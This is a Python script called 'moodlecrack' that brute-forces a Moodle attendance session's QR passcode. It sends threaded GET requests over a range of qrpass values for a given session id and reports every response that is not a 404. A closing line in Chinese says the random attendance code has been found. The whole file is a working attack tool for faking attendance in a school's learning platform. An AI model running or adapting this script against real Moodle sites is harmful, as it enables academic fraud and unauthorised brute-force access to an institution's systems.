import concurrent.futures
import requests
import time
import re
import sys

title = '''
     __  __                    _  _          _____                     _
    |  \/  |                  | || |        / ____|                   | |
    | \  / |  ___    ___    __| || |  ___  | |      _ __   __ _   ___ | | __
    | |\/| | / _ \  / _ \  / _` || | / _ \ | |     | '__| / _` | / __|| |/ /
    | |  | || (_) || (_) || (_| || ||  __/ | |____ | |   | (_| || (__ |   <
    |_|  |_| \___/  \___/  \__,_||_| \___|  \_____||_|    \__,_| \___||_|\_\

    v1.0

    usage: python moodlecrack.py [baseurl] [sessid] [maxworker] [enummaxqrpass]
    
'''

cnt = 0
ENUM_MAXQRPASS = None

class Crack():
    def __init__(self, baseurl, SESSID, MAX_WORKERS):
        self._MAX_WORKERS = int(MAX_WORKERS)
        url = baseurl + '?qrpass={}&sessid={}'
        self._urls = [url.format(page, SESSID) for page in range(1, ENUM_MAXQRPASS)] 
        self._start_time = time.time()

    @staticmethod
    def scrape(url):
        r = requests.get(url)
        global cnt
        print('\r' + '[Progress]:[%s%s]%.2f%%;' % (
            '█' * int((cnt:=cnt+1)*20/ENUM_MAXQRPASS), ' ' * (20-int(cnt*20/ENUM_MAXQRPASS)),
            float(cnt/ENUM_MAXQRPASS*100)), end='')
        if(r.status_code != 404):
            print("\r[+]", r.status_code, url)
        time.sleep(0.5)
        
    def run(self):
        with concurrent.futures.ThreadPoolExecutor(max_workers=self._MAX_WORKERS) as executor:
            executor.map(Crack.scrape, self._urls)
        self.waste_time = time.time() - self._start_time
        end_time = time.time()
        
    
    
if __name__ == '__main__':
    print(title)
    time.sleep(0.5)
    if len(sys.argv) != 5:
        print('usage: python moodlecrack.py [baseurl] [sessid] [maxworker] [enummaxqrpass]')
        sys.exit()
    ENUM_MAXQRPASS = int(sys.argv[-1])
    crack = Crack(*sys.argv[1:-1])
    crack.run()
    print(f"{crack.waste_time} 秒完成 {ENUM_MAXQRPASS} 次的找尋隨機出席代碼完成")
    